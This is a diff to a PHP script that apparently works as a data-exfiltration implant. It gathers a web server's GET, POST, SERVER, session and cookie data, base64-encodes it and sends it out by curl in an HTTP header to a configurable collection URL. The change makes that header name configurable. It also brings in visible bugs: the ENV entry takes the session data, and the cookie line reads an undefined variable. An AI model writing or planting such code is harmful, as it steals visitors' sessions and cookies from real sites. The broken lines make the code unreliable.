@@ -43,6 +43,7 @@ if (stristr(PHP_OS, 'WIN')) {
 
 # define('HCS_EXF_FILE_FILENAME', 'hcs.log');
 define('HCS_EXF_HTTP_HEAD_URL', 'http://localhost/header_dumper.php');
+define('HCS_EXF_HTTP_HEAD_HEADER', 'X-HCS-Payload');
 define('HCS_EXFILTRATION_MODE', HCS_EXF_HTTP_HEAD);
 
 /* Functions */
@@ -68,13 +69,13 @@ function hcs_exfiltrate_session() {
 
     $session_data = Array(
         'GET'       => (array) $_GET,
-        'ENV'       => (array) $_ENV,
         'SERVER'    => (array) $_SERVER
         );
 
+    if (isset($_ENV)) $session_data['ENV'] = $_SESSION;
     if (isset($_SESSION)) $session_data['SESSION'] = $_SESSION;
     if (isset($_POST)) $session_data['POST'] = $_POST;
-    if (isset($_COOKIES)) $session_data['COOKIES'] = $_COOKIES;
+    if (isset($_COOKIE)) $session_data['COOKIE'] = $_COOKIES;
 
     switch (HCS_EXFILTRATION_MODE) {
         case HCS_EXF_HTTP_HEAD:
@@ -119,7 +120,7 @@ function hcs_exf_http_head($session_data) {
 
     // Set our payload
     $encoded_data = base64_encode(serialize($session_data));
-    curl_setopt($ch, CURLOPT_HTTPHEADER, Array("X-HCS-Payload: $encoded_data")); 
+    curl_setopt($ch, CURLOPT_HTTPHEADER, Array(HCS_EXF_HTTP_HEAD_HEADER.": $encoded_data")); 
 
     curl_exec ($ch); // dont mind return
     curl_close ($ch);
